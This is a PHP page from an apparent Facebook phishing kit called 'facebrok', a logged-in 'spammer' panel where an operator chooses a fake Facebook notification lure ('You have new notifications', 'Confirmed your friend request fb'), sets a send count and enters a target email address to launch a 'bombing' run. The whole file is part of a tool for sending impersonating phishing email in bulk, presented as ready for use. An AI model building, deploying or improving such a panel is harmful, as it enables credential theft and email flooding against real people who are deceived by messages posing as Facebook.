<?php
// facebrok 
// Spammer, templates.
session_start();
error_reporting(0);
if($_SESSION['user']){
include ("config.php");
//-----------------------------------
?>
<!--
 ______
 | ___|
 | |_____________________  ___ _______  __
 |  ______ | ___|  __ | |__| |/ /_ | | / /
 | || |  | | |  | ____| __ | | / | | |/ /
 | || |__| | |__| |___||_| |  /|_| |   |
 |_||____,,|____|_____|____|__|____|_|\_\
        one tool awesome for you.
-->
<title>facebrok - spammer</title>
<link rel="shortcut icon" href="facebook.png" />
<link href="minify.css" rel="stylesheet" type="text/css"/>
<link href="login.css " rel="stylesheet" type="text/css"/>
<body class="login">
<style type="text/css" media="screen"><!--a:link   {text-decoration:none;}   --></style>
<?php include ("bar.php"); ?>
<div class="content">
<h4 class="form-title" title="methods"><center>spammer<center></h4>
<div id="a">
<form method="post" action="bombing" target="_blank">

<span style="color:#666;font-size:14"><span style="font-family: Arial;"><pre>
<input name="plant" type="radio" value="1" checked> Check out my Facebook profile.
<input name="plant" type="radio" value="2"> You have new notifications.
<input name="plant" type="radio" value="3"> Confirmed your friend request fb.

Number To Send : <input name="many" type="text" style="width: 44px" value="1"></pre>



<center>
Target <input type="email" placeholder="target@hotmail.com" title="target" required="required" name="target" value=""><br>
<input type="submit" title="launch" name="launch" class="btn purple pull-right" value="Launch"></center></form></div>

<br>
<br><a title="Back" href="panel">
<span style="color:#666;font-size:14"><span style="font-family: Arial;">back</a>
<?php } else {header("location:../croak");} ?>